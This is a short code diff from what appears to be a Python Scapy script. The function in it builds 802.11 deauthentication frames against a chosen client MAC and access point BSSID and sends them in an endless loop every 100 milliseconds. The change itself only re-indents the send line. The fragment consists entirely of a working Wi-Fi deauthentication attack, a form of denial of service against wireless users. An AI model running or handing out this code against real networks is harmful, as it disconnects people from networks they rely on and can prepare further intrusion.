@@ -14,4 +14,4 @@ def deautenticate_user(iface: str, bssid: str, target_mac: str):
     dot11 = Dot11(addr1=target_mac, addr2=bssid, addr3=bssid)
     frame = RadioTap()/dot11/Dot11Deauth(reason=7)
     while True:
-        sendp(frame, iface=iface, inter=0.100 , verbose = 0)
+      sendp(frame, iface=iface, inter=0.100 , verbose = 0)
